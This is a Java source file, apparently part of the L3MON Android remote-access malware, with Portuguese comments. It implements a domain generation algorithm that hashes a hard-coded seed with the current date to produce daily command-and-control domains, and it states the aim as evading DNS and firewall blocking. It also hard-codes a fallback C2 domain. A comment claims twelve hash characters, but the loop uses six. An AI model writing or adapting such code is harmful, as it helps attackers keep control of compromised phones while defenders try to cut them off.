package com.etechd.l3mon.managers;

import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * DGAManager - Domain Generation Algorithm
 * Gera domínios dinâmicos baseados na data atual para evitar bloqueios de DNS/Firewall.
 */
public class DGAManager {

    private static final String SEED = "L3M0N_SECRET_INFRA_2024"; // Segredo compartilhado entre Client e C2
    private static final String TLD = ".com";
    private static final String BASE_DOMAIN_PREFIX = "srv-";

    /**
     * Gera o domínio para o dia atual.
     */
    public static String getCurrentDayDomain() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
        String dateStr = sdf.format(new Date());
        return generateDomain(dateStr);
    }

    /**
     * Gera o domínio para uma data específica (útil para failover de fuso horário).
     */
    public static String generateDomain(String dateStr) {
        try {
            String input = SEED + dateStr;
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(input.getBytes("UTF-8"));
            
            StringBuilder sb = new StringBuilder();
            sb.append(BASE_DOMAIN_PREFIX);
            
            // Usa os primeiros 12 caracteres do hash convertido para letras/números
            for (int i = 0; i < 6; i++) {
                int val = hash[i] & 0xFF;
                char c = (char) ('a' + (val % 26));
                sb.append(c);
            }
            
            return sb.toString() + TLD;
        } catch (Exception e) {
            return "fallback-infra.com"; // Domínio de emergência
        }
    }
}